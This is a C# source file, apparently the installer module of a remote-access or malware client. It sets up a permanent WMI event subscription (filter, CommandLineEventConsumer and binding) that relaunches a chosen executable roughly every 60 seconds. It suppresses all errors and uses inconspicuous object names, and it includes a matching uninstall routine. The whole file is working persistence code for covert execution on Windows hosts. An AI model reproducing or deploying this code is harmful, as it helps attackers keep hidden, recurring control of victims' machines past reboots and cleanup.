using System;
using System.IO;
using System.Management;
using Microsoft.Win32.TaskScheduler;

namespace Client.Install
{
    public static class WmiPersistence
    {
        private static readonly string FilterName = "XyaEventFilter";
        private static readonly string ConsumerName = "XyaEventConsumer";
        private static readonly string BindingName = "XyaEventBinding";

        public static bool Install(string executablePath)
        {
            try
            {
                if (!File.Exists(executablePath))
                    return false;

                ManagementScope scope = new ManagementScope(@"\\.\root\subscription");
                scope.Connect();

                CreateEventFilter(scope);
                CreateEventConsumer(scope, executablePath);
                CreateBinding(scope);

                return true;
            }
            catch
            {
                return false;
            }
        }

        private static void CreateEventFilter(ManagementScope scope)
        {
            try
            {
                ManagementClass wmiClass = new ManagementClass(scope, new ManagementPath("__EventFilter"), null);
                ManagementObject filter = wmiClass.CreateInstance();
                
                filter["Name"] = FilterName;
                filter["EventNamespace"] = @"root\cimv2";
                filter["QueryLanguage"] = "WQL";
                filter["Query"] = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'";
                
                filter.Put();
            }
            catch { }
        }

        private static void CreateEventConsumer(ManagementScope scope, string executablePath)
        {
            try
            {
                ManagementClass wmiClass = new ManagementClass(scope, new ManagementPath("CommandLineEventConsumer"), null);
                ManagementObject consumer = wmiClass.CreateInstance();
                
                consumer["Name"] = ConsumerName;
                consumer["ExecutablePath"] = executablePath;
                consumer["CommandLineTemplate"] = executablePath;
                
                consumer.Put();
            }
            catch { }
        }

        private static void CreateBinding(ManagementScope scope)
        {
            try
            {
                ManagementClass wmiClass = new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"), null);
                ManagementObject binding = wmiClass.CreateInstance();
                
                binding["Filter"] = @"__EventFilter.Name=""" + FilterName + @"""";
                binding["Consumer"] = @"CommandLineEventConsumer.Name=""" + ConsumerName + @"""";
                
                binding.Put();
            }
            catch { }
        }

        public static void Uninstall()
        {
            try
            {
                ManagementScope scope = new ManagementScope(@"\\.\root\subscription");
                scope.Connect();

                DeleteInstance(scope, "__FilterToConsumerBinding", "Filter", FilterName);
                DeleteInstance(scope, "CommandLineEventConsumer", "Name", ConsumerName);
                DeleteInstance(scope, "__EventFilter", "Name", FilterName);
            }
            catch { }
        }

        private static void DeleteInstance(ManagementScope scope, string className, string propertyName, string propertyValue)
        {
            try
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, 
                    new ObjectQuery($"SELECT * FROM {className} WHERE {propertyName} = '{propertyValue}'"));

                foreach (ManagementObject obj in searcher.Get())
                {
                    obj.Delete();
                }
            }
            catch { }
        }
    }
}
